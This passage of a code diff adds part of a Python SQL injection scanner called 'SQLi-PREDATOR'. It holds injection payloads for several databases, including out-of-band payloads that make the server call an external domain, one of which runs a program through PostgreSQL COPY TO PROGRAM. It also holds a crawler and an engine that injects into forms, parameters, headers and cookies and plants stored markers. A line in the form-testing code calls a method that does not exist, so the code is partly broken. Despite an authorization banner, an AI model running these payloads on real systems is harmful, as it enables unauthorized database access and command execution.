+    Payload("' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL --", PayloadCategory.UNION_PROBE, "UNION ALL (5 cols)"),
+    Payload("' UNION SELECT VERSION(),2,3 --", PayloadCategory.UNION_PROBE, "UNION with VERSION() function", base_complexity=3),
+    Payload("' UNION SELECT @@VERSION,2,3 --", PayloadCategory.UNION_PROBE, "UNION with @@VERSION variable", db_types=["mssql"], base_complexity=3),
+
+    # ═══════════════════════════════════════════════════════
+    #  STACKED QUERIES — Multi-statement execution
+    # ═══════════════════════════════════════════════════════
+    Payload("1'; SELECT SLEEP(3) --", PayloadCategory.STACKED_QUERY, "MySQL stacked SLEEP", db_types=["mysql"],
+            expected_behavior="~3s delay if stacked queries supported", base_complexity=3),
+    Payload("1'; WAITFOR DELAY '0:0:3' --", PayloadCategory.STACKED_QUERY, "MSSQL stacked WAITFOR", db_types=["mssql"], base_complexity=3),
+    Payload("1'; SELECT pg_sleep(3) --", PayloadCategory.STACKED_QUERY, "PostgreSQL stacked pg_sleep", db_types=["postgresql"], base_complexity=3),
+    Payload("1'; SELECT 1; --", PayloadCategory.STACKED_QUERY, "Stacked SELECT — tests multi-stmt", expected_behavior="If no error, stacked queries supported", base_complexity=3),
+    Payload("1'; CALL SLEEP(3); --", PayloadCategory.STACKED_QUERY, "MySQL CALL stacked", db_types=["mysql"], base_complexity=4),
+
+    # ═══════════════════════════════════════════════════════
+    #  OOB (OUT-OF-BAND) — DNS/HTTP exfiltration detection
+    # ═══════════════════════════════════════════════════════
+    Payload("' UNION SELECT EXTRACTVALUE(xmltype('<!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://{oob}\"> %remote;]>'),'/l') FROM dual --",
+            PayloadCategory.OOB_DNS, "Oracle XXE-based OOB interaction", db_types=["oracle"],
+            requires_oob_domain=True, expected_behavior="DNS callback to OOB domain", base_complexity=7),
+    Payload("'; exec master..xp_dirtree '//{oob}/a' --",
+            PayloadCategory.OOB_DNS, "MSSQL xp_dirtree UNC path OOB", db_types=["mssql"],
+            requires_oob_domain=True, expected_behavior="SMB/DNS callback", base_complexity=5),
+    Payload("1'; exec master..xp_fileexist '\\\\{oob}\\file' --",
+            PayloadCategory.OOB_DNS, "MSSQL xp_fileexist UNC OOB", db_types=["mssql"],
+            requires_oob_domain=True, base_complexity=5),
+    Payload("1'; exec master..xp_subdirs '\\\\{oob}\\dir' --",
+            PayloadCategory.OOB_DNS, "MSSQL xp_subdirs UNC OOB", db_types=["mssql"],
+            requires_oob_domain=True, base_complexity=5),
+    Payload("' OR (SELECT UTL_INADDR.GET_HOST_ADDRESS('{oob}') FROM DUAL) --",
+            PayloadCategory.OOB_DNS, "Oracle GET_HOST_ADDRESS DNS lookup", db_types=["oracle"],
+            requires_oob_domain=True, base_complexity=5),
+    Payload("' OR (SELECT UTL_HTTP.REQUEST('http://{oob}/from_oracle') FROM DUAL) --",
+            PayloadCategory.OOB_HTTP, "Oracle UTL_HTTP outbound request", db_types=["oracle"],
+            requires_oob_domain=True, base_complexity=6),
+    Payload("1'; COPY (SELECT 'oob_test') TO PROGRAM 'nslookup {oob}' --",
+            PayloadCategory.OOB_DNS, "PostgreSQL COPY TO PROGRAM DNS", db_types=["postgresql"],
+            requires_oob_domain=True, expected_behavior="DNS callback", base_complexity=7),
+    Payload("1'; SELECT lo_import('\\\\{oob}\\test'); --",
+            PayloadCategory.OOB_DNS, "PostgreSQL lo_import UNC OOB", db_types=["postgresql"],
+            requires_oob_domain=True, base_complexity=6),
+
+    # ═══════════════════════════════════════════════════════
+    #  SECOND-ORDER MARKERS — Persistent payloads
+    # ═══════════════════════════════════════════════════════
+    Payload("s2_marker_'", PayloadCategory.SECOND_ORDER_MARKER, "Second-order marker — quote break"),
+    Payload("s2_'||'marker", PayloadCategory.SECOND_ORDER_MARKER, "Second-order marker — concat"),
+    Payload("s2_' OR SLEEP(3) -- marker", PayloadCategory.SECOND_ORDER_MARKER, "Second-order marker — time delay"),
+
+    # ═══════════════════════════════════════════════════════
+    #  HEADER INJECTION PROBES
+    # ═══════════════════════════════════════════════════════
+    Payload("' OR SLEEP(3) --", PayloadCategory.HEADER_INJECTION, "Header time-based probe"),
+    Payload("' OR 1=1 --", PayloadCategory.HEADER_INJECTION, "Header boolean probe"),
+    Payload("' UNION SELECT NULL --", PayloadCategory.HEADER_INJECTION, "Header UNION probe"),
+]
+
+# =============================================================================
+#  ERROR SIGNATURE DATABASE — EXPANDED
+# =============================================================================
+
+SQL_ERROR_SIGNATURES: Dict[str, List[str]] = {
+    "generic": [
+        "sql syntax", "mysql_fetch", "mysql_num_rows", "mysql_query", "mysql_error",
+        "odbc_", "postgresql", "pg_query", "oracle", "oci_", "sqlite",
+        "unclosed quotation mark", "quoted string not properly terminated",
+        "for the right syntax to use", "you have an error in your sql syntax",
+        "warning: mysql", "mysql server version", "incorrect syntax near",
+        "unclosed quote", "supplied argument is not a valid mysql",
+        "db2", "microsoft ole db", "microsoft access", "driver",
+        "unexpected token", "syntax error", "query failed",
+    ],
+    "mysql": [
+        "you have an error in your sql syntax", "mysql_fetch_array",
+        "mysql_fetch_assoc", "mysql_fetch_object", "mysql_fetch_row",
+        "mysql_num_rows", "mysql_query", "mysql_error", "mysql_connect",
+        "mysql_real_escape_string", "supplied argument is not a valid mysql",
+        "mysql server version for the right syntax",
+        "near '", "at line 1", "error in your sql syntax",
+        "warning: mysql_numrows()", "warning: mysql_fetch_array()",
+        "duplicate entry", "for key", "xpatherror", "extractvalue",
+        "updatexml", "group function", "subquery returns more than 1 row",
+        "unknown column", "table", "doesn't exist",
+        "select * from",
+    ],
+    "mssql": [
+        "unclosed quotation mark", "incorrect syntax near",
+        "microsoft ole db", "microsoft sql server", "driver",
+        "odbc sql server", "sqlserver", "microsoft oledb",
+        "microsoft odbc", "warning: mssql",
+        "line ", "procedure", "conversion failed",
+        "string or binary data", "invalid column name",
+        "string or binary", "datetime overflow",
+        "subquery returned more than 1 value",
+        "violation of primary key",
+    ],
+    "oracle": [
+        "ora-", "oracle error", "oracle driver",
+        "oci_", "oci8", "oci_execute", "oci_fetch", "oci_parse",
+        "pls-", "sp2-", "warning: oci",
+        "oracle database error", "invalid sql statement",
+        "missing keyword", "missing expression",
+        "invalid number", "invalid character",
+    ],
+    "postgresql": [
+        "postgresql", "pg_query", "pg_exec", "pg_fetch",
+        "pg_numrows", "pg_connect", "warning: pg",
+        "error in your sql syntax", "invalid input syntax",
+        "relation", "does not exist", "column", "not found",
+        "division by zero", "function", "does not exist",
+        "operator does not exist", "type", "does not exist",
+        "current transaction is aborted",
+        "more than one row",
+    ],
+    "sqlite": [
+        "sqlite", "sqlite3", "sqlite_fetch", "sqlite_query",
+        "sqlite_num_rows", "warning: sqlite",
+        "unrecognized token", "no such table", "no such column",
+        "sql logic error", "constraint failed",
+        "database disk image is malformed",
+    ],
+}
+
+# =============================================================================
+#  LOGGING
+# =============================================================================
+
+class ColoredFormatter(logging.Formatter):
+    COLORS = {
+        'DEBUG': '\033[36m', 'INFO': '\033[32m', 'WARNING': '\033[33m',
+        'ERROR': '\033[31m', 'CRITICAL': '\033[41m',
+    }
+    RESET = '\033[0m'
+
+    def format(self, record: logging.LogRecord) -> str:
+        level = record.levelname
+        color = self.COLORS.get(level, self.RESET)
+        record.levelname = f"{color}{level:8}{self.RESET}"
+        return super().format(record)
+
+def setup_logging(verbose: bool = False) -> logging.Logger:
+    logger = logging.getLogger("sqli_predator")
+    logger.setLevel(logging.DEBUG if verbose else logging.INFO)
+    handler = logging.StreamHandler(sys.stdout)
+    handler.setLevel(logging.DEBUG if verbose else logging.INFO)
+    handler.setFormatter(ColoredFormatter(
+        "%(asctime)s | %(levelname)s | %(message)s", datefmt="%H:%M:%S"))
+    logger.handlers.clear()
+    logger.addHandler(handler)
+    return logger
+
+log = setup_logging()
+
+# =============================================================================
+#  AUTHORIZATION
+# =============================================================================
+
+AUTH_PROMPT = """
+╔══════════════════════════════════════════════════════════════════════════════╗
+║                    ⚠ AUTHORIZATION CONFIRMATION REQUIRED ⚠                ║
+║                                                                              ║
+║  SQLi-PREDATOR is an advanced educational detection engine.                  ║
+║  Use ONLY on:                                                                ║
+║    • Local DVWA, bWAPP, OWASP Juice Shop, WebGoat                           ║
+║    • Systems you own or have WRITTEN PERMISSION to test                     ║
+║                                                                              ║
+║  Unauthorized use = illegal. By proceeding you certify authorization.        ║
+╚══════════════════════════════════════════════════════════════════════════════╝
+"""
+
+# =============================================================================
+#  OOB COLLABORATOR CLIENT
+# =============================================================================
+
+class OOBClient:
+    """
+    Lightweight OOB detection client.
+    Uses Interactsh (projectdiscovery) for receiving DNS/HTTP callbacks.
+    Falls back to Burp Collaborator if available.
+    """
+
+    INTERACTSH_SERVERS = [
+        "oast.fun",
+        "oast.live",
+        "oast.site",
+        "oast.online",
+        "oast.pro",
+        "oast.me",
+        "interactsh.com",
+    ]
+
+    def __init__(self, custom_domain: Optional[str] = None):
+        self.domain = custom_domain or random.choice(self.INTERACTSH_SERVERS)
+        self.correlation_id = self._generate_correlation_id()
+        self.callback_domain = f"{self.correlation_id}.{self.domain}"
+        self.interactions: List[Dict] = []
+        self.active = False
+        self._poll_thread: Optional[threading.Thread] = None
+
+    def _generate_correlation_id(self) -> str:
+        """Generate a unique correlation ID for callback tracking."""
+        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=16))
+
+    def start(self) -> str:
+        """Start polling for OOB interactions in background."""
+        self.active = True
+        self._poll_thread = threading.Thread(target=self._poll_loop, daemon=True)
+        self._poll_thread.start()
+        log.info(f"[OOB] Listening for callbacks on {self.callback_domain}")
+        return self.callback_domain
+
+    def stop(self) -> List[Dict]:
+        """Stop polling and return collected interactions."""
+        self.active = False
+        if self._poll_thread:
+            self._poll_thread.join(timeout=3)
+        return self.interactions
+
+    def _poll_loop(self) -> None:
+        """Poll Interactsh API for interactions."""
+        poll_url = f"https://{self.domain}/api/v1/interactsh/{self.correlation_id}/poll"
+        while self.active:
+            try:
+                resp = requests.get(poll_url, timeout=10)
+                if resp.status_code == 200:
+                    data = resp.json()
+                    for entry in data.get("data", []):
+                        self.interactions.append({
+                            "timestamp": entry.get("timestamp"),
+                            "protocol": entry.get("protocol"),
+                            "unique_id": entry.get("unique-id"),
+                            "raw_request": entry.get("raw-request", ""),
+                            "remote_address": entry.get("remote-address"),
+                        })
+                        log.info(f"[OOB] Callback received: {entry.get('protocol')} from {entry.get('remote-address')}")
+                time.sleep(2)
+            except Exception:
+                time.sleep(5)
+
+    def generate_payload(self, template: str) -> str:
+        """Substitute {oob} placeholder with actual callback domain."""
+        return template.replace("{oob}", self.callback_domain)
+
+# =============================================================================
+#  STATISTICAL TIMING ANALYZER
+# =============================================================================
+
+class TimingAnalyzer:
+    """
+    Statistical analysis for time-based blind SQLi detection.
+    Uses multiple samples and z-test / t-test to distinguish
+    real delays from network jitter.
+    """
+
+    def __init__(self, min_samples: int = 3, z_threshold: float = 3.5):
+        self.min_samples = min_samples
+        self.z_threshold = z_threshold
+        self.profiles: Dict[str, StatisticalTimingProfile] = defaultdict(StatisticalTimingProfile)
+
+    def record_baseline(self, param_key: str, elapsed: float) -> None:
+        """Record a baseline timing sample."""
+        profile = self.profiles[param_key]
+        profile.baseline_samples.append(elapsed)
+        if len(profile.baseline_samples) >= 3:
+            profile.baseline_mean = mean(profile.baseline_samples)
+            profile.baseline_stdev = stdev(profile.baseline_samples) if len(profile.baseline_samples) > 1 else 0.01
+
+    def record_test(self, param_key: str, payload: str, elapsed: float) -> None:
+        """Record a test timing sample for a specific payload."""
+        self.profiles[param_key].test_samples[payload].append(elapsed)
+
+    def analyze(self, param_key: str, payload: str) -> Tuple[bool, float, float, int]:
+        """
+        Analyze timing for a payload.
+        Returns: (is_significant, z_score, p_value, sample_count)
+        """
+        profile = self.profiles[param_key]
+        samples = profile.test_samples.get(payload, [])
+        if len(samples) < self.min_samples:
+            return False, 0.0, 1.0, len(samples)
+
+        mean_test = mean(samples)
+        baseline_mean = profile.baseline_mean or 0.001
+        baseline_std = max(profile.baseline_stdev, 0.001)
+        std_test = stdev(samples) if len(samples) > 1 else baseline_std
+
+        # Pooled standard error
+        n1 = len(profile.baseline_samples)
+        n2 = len(samples)
+        if n1 < 2 or n2 < 2:
+            return False, 0.0, 1.0, len(samples)
+
+        pooled_std = math.sqrt(
+            ((n1 - 1) * baseline_std**2 + (n2 - 1) * std_test**2) / (n1 + n2 - 2)
+        )
+        if pooled_std == 0:
+            pooled_std = 0.001
+
+        # Z-score
+        z = (mean_test - baseline_mean) / (pooled_std * math.sqrt(1/n1 + 1/n2))
+
+        # Approximate p-value from z-score (two-tailed)
+        p_value = 2 * (1 - self._normal_cdf(abs(z)))
+
+        # Determine significance
+        is_significant = abs(z) >= self.z_threshold and mean_test - baseline_mean >= 1.0
+
+        return is_significant, z, p_value, len(samples)
+
+    def _normal_cdf(self, x: float) -> float:
+        """Approximate standard normal CDF using Abramowitz & Stegun."""
+        if x < 0:
+            return 1 - self._normal_cdf(-x)
+        k = 1 / (1 + 0.2316419 * x)
+        poly = k * (0.319381530 + k * (-0.356563782 + k * (1.781477937 + k * (-1.821255978 + k * 1.330274429))))
+        return 1 - 0.3989422804014327 * math.exp(-x * x / 2) * (1 - poly) if poly else 1 - 0.3989422804014327 * math.exp(-x * x / 2)
+
+# =============================================================================
+#  CRAWLER — Enhanced
+# =============================================================================
+
+class Crawler:
+    def __init__(self, profile: ScanProfile):
+        self.profile = profile
+        self.session = self._build_session()
+        self.visited: Set[str] = set()
+        self.discovered_forms: List[FormDetails] = []
+        self.discovered_params: List[Tuple[str, str, Optional[str]]] = []  # (url, param_name, sample_value)
+        self.discovered_urls: Set[str] = set()
+        self.discovered_headers: List[str] = []  # Headers to test
+
+    def _build_session(self) -> requests.Session:
+        s = requests.Session()
+        s.headers.update({
+            "User-Agent": self.profile.user_agent,
+            "Accept": "*/*",
+            "Accept-Language": "en-US,en;q=0.9",
+        })
+        s.verify = self.profile.verify_ssl
+        if self.profile.auth_cookie:
+            for cookie in self.profile.auth_cookie.split(";"):
+                if "=" in cookie:
+                    k, v = cookie.strip().split("=", 1)
+                    s.cookies.set(k, v)
+        if self.profile.auth_header:
+            s.headers.update(self.profile.auth_header)
+        if self.profile.auth_credentials:
+            s.auth = self.profile.auth_credentials
+        return s
+
+    def _normalize(self, base: str, link: str) -> Optional[str]:
+        p = urlparse(link)
+        if not p.netloc:
+            link = urljoin(base, link)
+        p = urlparse(link)
+        link = p._replace(fragment="").geturl()
+        target_netloc = urlparse(self.profile.target_url).netloc
+        if p.netloc and p.netloc != target_netloc:
+            return None
+        if p.scheme not in ("http", "https"):
+            return None
+        return link
+
+    def _extract_forms(self, soup: BeautifulSoup, page_url: str) -> List[FormDetails]:
+        forms: List[FormDetails] = []
+        for ftag in soup.find_all("form"):
+            action = ftag.get("action", "") or page_url
+            action = urljoin(page_url, action)
+            method = ftag.get("method", "GET").upper()
+            enctype = ftag.get("enctype", "application/x-www-form-urlencoded")
+            inputs: List[FormField] = []
+            for itag in ftag.find_all(["input", "textarea", "select"]):
+                name = itag.get("name", "")
+                if not name:
+                    continue
+                itype = itag.get("type", "text").lower()
+                value = itag.get("value", "")
+                is_hidden = itype == "hidden"
+                is_submit = itype == "submit"
+                is_file = itype == "file"
+                inputs.append(FormField(name, itype, value or None, is_hidden, is_submit, is_file))
+            if inputs:
+                forms.append(FormDetails(action, method, inputs, page_url, enctype))
+        return forms
+
+    def crawl(self, start_url: str, depth: int = 0) -> None:
+        if depth > self.profile.crawl_depth:
+            return
+        url = self._normalize(start_url, start_url)
+        if not url or url in self.visited:
+            return
+        self.visited.add(url)
+        log.info(f"Crawl [{depth}/{self.profile.crawl_depth}] {url}")
+
+        try:
+            resp = self.session.get(url, timeout=15, allow_redirects=True)
+            time.sleep(0.3)
+        except Exception as e:
+            log.warning(f"Crawl failed: {e}")
+            return
+
+        if resp.status_code >= 400:
+            return
+
+        soup = BeautifulSoup(resp.text, "html.parser")
+
+        # Forms
+        forms = self._extract_forms(soup, url)
+        self.discovered_forms.extend(forms)
+        log.info(f"  Forms: {len(forms)}")
+
+        # URL parameters
+        parsed = urlparse(url)
+        if parsed.query:
+            for k, vals in urllib.parse.parse_qs(parsed.query).items():
+                self.discovered_params.append((url, k, vals[0] if vals else None))
+                log.info(f"  Param: {k}={vals[0][:50] if vals else ''}")
+
+        # Continue crawling
+        for atag in soup.find_all("a", href=True):
+            href = atag["href"]
+            abs_url = self._normalize(url, href)
+            if abs_url and abs_url not in self.visited:
+                self.crawl(abs_url, depth + 1)
+
+    def get_baseline(self, url: str, method: str = "GET",
+                     data: Optional[Dict] = None,
+                     params: Optional[Dict] = None) -> Optional[BaselineResponse]:
+        try:
+            start = time.monotonic()
+            if method == "POST":
+                resp = self.session.post(url, data=data, timeout=self.profile.timeout, allow_redirects=True)
+            else:
+                resp = self.session.get(url, params=params, timeout=self.profile.timeout, allow_redirects=True)
+            elapsed = time.monotonic() - start
+            body_lower = resp.text.lower()
+            keywords = set()
+            for word in ["error", "warning", "exception", "invalid", "syntax", "mysql", "sql"]:
+                if word in body_lower:
+                    keywords.add(word)
+            return BaselineResponse(
+                status_code=resp.status_code,
+                content_length=len(resp.content),
+                content_hash=hashlib.md5(resp.content).hexdigest(),
+                body_snippet=resp.text[:500],
+                response_time=elapsed,
+                headers=dict(resp.headers),
+                body_keywords=keywords,
+                has_login_form='password' in body_lower or 'login' in body_lower,
+                has_error=any(e in body_lower for e in ["error", "exception", "warning"]),
+            )
+        except Exception as e:
+            log.warning(f"Baseline failed: {e}")
+            return None
+
+# =============================================================================
+#  DETECTION ENGINE — Core
+# =============================================================================
+
+class DetectionEngine:
+    def __init__(self, profile: ScanProfile, oob_client: Optional[OOBClient] = None):
+        self.profile = profile
+        self.oob = oob_client
+        self.session = self._build_session()
+        self.timing_analyzer = TimingAnalyzer(min_samples=profile.time_samples_per_payload)
+        self.findings: List[SQLiFinding] = []
+        self.second_order_records: List[SecondOrderRecord] = []
+        self.baselines: Dict[str, BaselineResponse] = {}
+        self._lock = threading.Lock()
+
+    def _build_session(self) -> requests.Session:
+        s = requests.Session()
+        s.headers.update({
+            "User-Agent": self.profile.user_agent,
+            "Accept": "*/*",
+        })
+        s.verify = self.profile.verify_ssl
+        if self.profile.auth_cookie:
+            for c in self.profile.auth_cookie.split(";"):
+                if "=" in c:
+                    k, v = c.strip().split("=", 1)
+                    s.cookies.set(k, v)
+        if self.profile.auth_header:
+            s.headers.update(self.profile.auth_header)
+        if self.profile.auth_credentials:
+            s.auth = self.profile.auth_credentials
+        return s
+
+    def _param_key(self, url: str, param: str, vector: str) -> str:
+        return f"{vector}:{url}:{param}"
+
+    def _inject(self, url: str, param: str, payload: str, method: str = "GET",
+                vector: InjectionVector = InjectionVector.GET_PARAM,
+                form_data: Optional[Dict] = None,
+                extra_headers: Optional[Dict] = None,
+                timeout: Optional[float] = None) -> Tuple[Optional[requests.Response], float]:
+        """Inject a payload and return (response, elapsed_seconds)."""
+        headers = dict(extra_headers or {})
+        timeout = timeout or self.profile.timeout
+
+        try:
+            start = time.monotonic()
+
+            if vector == InjectionVector.COOKIE:
+                # Inject into cookie
+                s = self._build_session()
+                s.cookies.set(param, payload)
+                resp = s.get(url, timeout=timeout, allow_redirects=self.profile.follow_redirects)
+
+            elif vector == InjectionVector.USER_AGENT:
+                headers["User-Agent"] = payload
+                resp = self.session.get(url, headers=headers, timeout=timeout,
+                                        allow_redirects=self.profile.follow_redirects)
+
+            elif vector == InjectionVector.REFERER:
+                headers["Referer"] = payload
+                resp = self.session.get(url, headers=headers, timeout=timeout,
+                                        allow_redirects=self.profile.follow_redirects)
+
+            elif vector == InjectionVector.X_FORWARDED_FOR:
+                headers["X-Forwarded-For"] = payload
+                resp = self.session.get(url, headers=headers, timeout=timeout,
+                                        allow_redirects=self.profile.follow_redirects)
+
+            elif vector == InjectionVector.X_FORWARDED_HOST:
+                headers["X-Forwarded-Host"] = payload
+                resp = self.session.get(url, headers=headers, timeout=timeout,
+                                        allow_redirects=self.profile.follow_redirects)
+
+            elif vector == InjectionVector.CUSTOM_HEADER:
+                headers[param] = payload  # param is the header name
+                resp = self.session.get(url, headers=headers, timeout=timeout,
+                                        allow_redirects=self.profile.follow_redirects)
+
+            elif method == "POST":
+                data = dict(form_data or {})
+                data[param] = payload
+                resp = self.session.post(url, data=data, headers=headers, timeout=timeout,
+                                         allow_redirects=self.profile.follow_redirects)
+
+            else:  # GET
+                params_dict = {}
+                parsed = urlparse(url)
+                if parsed.query:
+                    params_dict = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)
+                params_dict[param] = [payload]
+                new_query = urllib.parse.urlencode(params_dict, doseq=True)
+                inject_url = parsed._replace(query=new_query).geturl()
+                resp = self.session.get(inject_url, headers=headers, timeout=timeout,
+                                        allow_redirects=self.profile.follow_redirects)
+
+            elapsed = time.monotonic() - start
+            return resp, elapsed
+
+        except requests.exceptions.Timeout:
+            return None, float(timeout)
+        except Exception as e:
+            log.debug(f"Injection failed: {e}")
+            return None, 0.0
+
+    # =========================================================================
+    #  DETECTION METHODS
+    # =========================================================================
+
+    def _check_error_signatures(self, body: str) -> Tuple[bool, List[str], str]:
+        """Check response body for known SQL error signatures."""
+        found: List[str] = []
+        db_hint = "unknown"
+        body_lower = body.lower()
+        for db_type, sigs in SQL_ERROR_SIGNATURES.items():
+            for sig in sigs:
+                if sig.lower() in body_lower:
+                    found.append(sig)
+                    if db_type != "generic":
+                        db_hint = db_type
+        return len(found) > 0, found, db_hint
+
+    def _score_confidence(self, finding: SQLiFinding) -> float:
+        """Calculate confidence score from all available evidence."""
+        score = 0.0
+
+        # Strongest signals
+        if finding.has_sql_errors:
+            score += 0.50
+        if finding.time_delay_detected:
+            score += 0.45
+        if finding.oob_interaction_id:
+            score += 0.60  # OOB is near-certain
+
+        # Response differences
+        if finding.response_difference_percent > 80:
+            score += 0.20
+        elif finding.response_difference_percent > 40:
+            score += 0.12
+        elif finding.response_difference_percent > 15:
+            score += 0.06
+
+        # Status code anomalies
+        if finding.test_status in (500, 400) and finding.baseline_status == 200:
+            score += 0.15
+        elif finding.test_status == 200 and finding.baseline_status >= 400:
+            score += 0.10
+
+        # Boolean pattern
+        if finding.is_boolean_positive is not None:
+            score += 0.20
+
+        # Timing statistical significance
+        if finding.timing_p_value < 0.01:
+            score += 0.20
+        elif finding.timing_p_value < 0.05:
+            score += 0.10
+
+        # DB-specific error + payload match
+        if finding.db_type_hint != "unknown" and finding.has_sql_errors:
+            score += 0.15
+
+        # Multiple error signatures
+        if len(finding.error_signatures_matched) >= 3:
+            score += 0.10
+
+        return min(score, 1.0)
+
+    def test_form(self, form: FormDetails) -> List[SQLiFinding]:
+        """Test all parameters in a form with payload variants."""
+        results: List[SQLiFinding] = []
+        baseline_key = form.action.split("?")[0]
+
+        for field in form.inputs:
+            if field.is_submit or field.is_file:
+                continue
+            if field.is_hidden and field.value:
+                continue  # skip hidden fields with fixed values
+
+            for payload, bypass in self._get_payload_variants_for_testing(field, form.method):
+                if form.method == "POST":
+                    data = {i.name: i.value or "test" for i in form.inputs if not i.is_submit and not i.is_hidden}
+                    data[field.name] = payload.value
+                    baseline = self.baselines.get(baseline_key)
+                    if not baseline:
+                        clean_data = {i.name: i.value or "test" for i in form.inputs if not i.is_submit}
+                        clean_data[field.name] = field.value or "test"
+                        baseline = self._get_session().fetch_baseline
+                        # get baseline via crawler
+                        crawler = Crawler(self.profile)
+                        baseline = crawler.get_baseline(form.action, "POST", clean_data)
+                        if baseline:
+                            self.baselines[baseline_key] = baseline
+
+                    resp, elapsed = self._inject(
+                        form.action, field.name, payload.value, "POST",
+                        vector=InjectionVector.POST_PARAM,
+                        form_data={i.name: i.value or "test" for i in form.inputs if not i.is_submit}
+                    )
+                else:
+                    baseline = self.baselines.get(baseline_key)
+                    if not baseline:
+                        crawler = Crawler(self.profile)
+                        baseline = crawler.get_baseline(form.action)
+                        if baseline:
+                            self.baselines[baseline_key] = baseline
+                    resp, elapsed = self._inject(
+                        form.action, field.name, payload.value, "GET",
+                        vector=InjectionVector.GET_PARAM
+                    )
+
+                finding = self._analyze_response(
+                    resp, elapsed, form.action, field.name,
+                    injection_vector="POST" if form.method == "POST" else "GET",
+                    payload=payload, bypass=bypass, baseline=baseline,
+                )
+                if finding and finding.confidence >= 0.3:
+                    results.append(finding)
+                    with self._lock:
+                        self.findings.append(finding)
+                    log.warning(f"  [!] SQLi on {form.action} [{field.name}] ({finding.severity}) "
+                                f"payload={payload.value[:50]} conf={finding.confidence:.0%}")
+
+                time.sleep(self.profile.request_delay)
+
+        return results
+
+    def test_param(self, url: str, param: str, sample_value: Optional[str] = None) -> List[SQLiFinding]:
+        """Test a URL query parameter."""
+        results: List[SQLiFinding] = []
+        base_url = url.split("?")[0]
+
+        for payload, bypass in self._get_payload_variants_for_testing(PayloadField(param, "text")):
+            resp, elapsed = self._inject(url, param, payload.value, "GET",
+                                         vector=InjectionVector.GET_PARAM)
+
+            baseline = self.baselines.get(base_url)
+            if not baseline:
+                crawler = Crawler(self.profile)
+                clean_params = {param: sample_value or "test"}
+                baseline = crawler.get_baseline(base_url, params=clean_params)
+                if baseline:
+                    self.baselines[base_url] = baseline
+
+            finding = self._analyze_response(
+                resp, elapsed, url, param,
+                injection_vector="GET",
+                payload=payload, bypass=bypass, baseline=baseline,
+            )
+            if finding and finding.confidence >= 0.3:
+                results.append(finding)
+                with self._lock:
+                    self.findings.append(finding)
+                log.warning(f"  [!] SQLi on {url} [{param}] ({finding.severity}) "
+                            f"payload={payload.value[:50]} conf={finding.confidence:.0%}")
+
+            time.sleep(self.profile.request_delay)
+
+        return results
+
+    def test_headers(self, url: str) -> List[SQLiFinding]:
+        """Test HTTP headers for SQL injection."""
+        results: List[SQLiFinding] = []
+        header_payloads = [p for p in PAYLOAD_CORE if p.category == PayloadCategory.HEADER_INJECTION]
+
+        # Headers to test
+        header_targets = [
+            (InjectionVector.USER_AGENT, "User-Agent"),
+            (InjectionVector.REFERER, "Referer"),
+            (InjectionVector.X_FORWARDED_FOR, "X-Forwarded-For"),
+            (InjectionVector.X_FORWARDED_HOST, "X-Forwarded-Host"),
+        ]
+
+        baseline = self.baselines.get(url.split("?")[0])
+        if not baseline:
+            crawler = Crawler(self.profile)
+            baseline = crawler.get_baseline(url)
+            if baseline:
+                self.baselines[url.split("?")[0]] = baseline
+
+        for vector, header_name in header_targets:
+            log.info(f"  Testing header: {header_name}")
+            for payload, bypass in self._get_payload_variants_for_testing(
+                PayloadField(header_name, "text"), payloads=header_payloads):
+                resp, elapsed = self._inject(
+                    url, header_name, payload.value, "GET", vector=vector)
+                finding = self._analyze_response(
+                    resp, elapsed, url, header_name,
+                    injection_vector=vector.value, payload=payload, bypass=bypass,
+                    baseline=baseline)
+                if finding and finding.confidence >= 0.3:
+                    results.append(finding)
+                    with self._lock:
+                        self.findings.append(finding)
+                    log.warning(f"  [!] SQLi in header {header_name} on {url} ({finding.severity})")
+                time.sleep(self.profile.request_delay)
+
+        return results
+
+    def test_cookies(self, url: str) -> List[SQLiFinding]:
+        """Test cookies for SQL injection."""
+        results: List[SQLiFinding] = []
+        payloads = [p for p in PAYLOAD_CORE if p.category != PayloadCategory.SECOND_ORDER_MARKER]
+
+        baseline = self.baselines.get(url.split("?")[0])
+
+        # Test common cookie names
+        cookie_names = ["PHPSESSID", "JSESSIONID", "ASPSESSIONID", "session", "token", "id", "user", "auth"]
+
+        for cookie_name in cookie_names:
+            for payload, bypass in self._get_payload_variants_for_testing(
+                PayloadField(cookie_name, "text"), payloads=payloads):
+                resp, elapsed = self._inject(
+                    url, cookie_name, payload.value, "GET", vector=InjectionVector.COOKIE)
+                finding = self._analyze_response(
+                    resp, elapsed, url, f"Cookie:{cookie_name}",
+                    injection_vector="Cookie", payload=payload, bypass=bypass,
+                    baseline=baseline)
+                if finding and finding.confidence >= 0.3:
+                    results.append(finding)
+                    with self._lock:
+                        self.findings.append(finding)
+                    log.warning(f"  [!] SQLi in cookie {cookie_name} ({finding.severity})")
+                time.sleep(self.profile.request_delay)
+
+        return results
+
+    def test_second_order(self, crawler: Crawler) -> List[SQLiFinding]:
+        """
+        Second-order SQLi detection.
+        Phase 1: Plant markers in writable fields.
+        Phase 2: Trigger read endpoints and check for marker activation.
+        """
+        results: List[SQLiFinding] = []
+        if not self.profile.test_second_order:
+            return results
+
+        log.info("Phase: Second-Order SQLi detection — planting markers...")
+        second_order_payloads = [p for p in PAYLOAD_CORE if p.category == PayloadCategory.SECOND_ORDER_MARKER]
+
+        # Find signup/register/profile forms
+        for form in crawler.discovered_forms:
+            if any(kw in form.action.lower() for kw in ['register', 'signup', 'profile', 'create', 'user', 'account']):
+                for field in form.inputs:
+                    if field.name.lower() in ('username', 'name', 'email', 'display_name', 'firstname', 'lastname'):
+                        for payload in second_order_payloads:
+                            # Plant the marker
+                            data = {i.name: i.value or "test" for i in form.inputs if not i.is_submit}
+                            data[field.name] = payload.value
+                            try:
+                                resp = self.session.post(form.action, data=data, timeout=10)
+                                log.info(f"  Planted second-order marker in {field.name} on {form.action}")
+                                rec = SecondOrderRecord(
+                                    injection_point=f"{form.action}:{field.name}",
+                                    payload_planted=payload.value,
+                                    db_table_hint=field.name,
+                                )
+                                self.second_order_records.append(rec)
+                                time.sleep(self.profile.request_delay)
+                            except Exception as e:
+                                log.warning(f"  Failed to plant: {e}")
+
+        # Phase 2: Trigger by visiting all pages that might display stored data
+        log.info("Phase: Second-Order — triggering stored markers...")
+        for rec in self.second_order_records:
+            for url in list(crawler.visited)[:10]:
+                try:
+                    resp = self.session.get(url, timeout=10)
+                    body = resp.text.lower()
